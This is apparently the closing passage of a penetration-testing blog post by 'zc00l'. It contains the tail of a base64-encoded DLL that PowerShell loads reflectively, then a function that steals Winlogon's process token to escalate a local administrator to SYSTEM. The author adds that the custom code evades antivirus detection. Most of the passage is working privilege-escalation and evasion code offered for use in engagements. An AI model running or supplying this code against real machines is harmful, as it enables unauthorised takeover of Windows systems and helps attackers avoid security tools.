AbABsAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMQA4AAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABcABoAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBUAG8AawBlAG4ARABMAEwALgBkAGwAbAAAAEwAFgABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAASQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgBUAG8AawBlAG4ARABMAEwAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAMAAAAuDQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")) | Out-Null
        Write-Output "DLL has been reflected."
    }
    
    if(-not [zc00l.ImpersonationToken]::ImpersonateProcessToken((Get-Process Winlogon).Id))
    {
        Write-Output "Could not Impersonate Token! Maybe you are not Local Admin?";
        return;
    }
    Write-Output "We are: $([Environment]::Username)"
}
```


Execute this as a Local Administrator over your STA powershell and you will be SYSTEM.

![Screenshot](/assets/windows_api-05.JPG)

I hope you liked this technique, it can be useful in engagements where public or known tools are easily caught by anti-viruses solutions as this (until the moment I have posted it) is custom code and probably very few (or no) solutions are able to detect it.

Best regards, 

zc00l.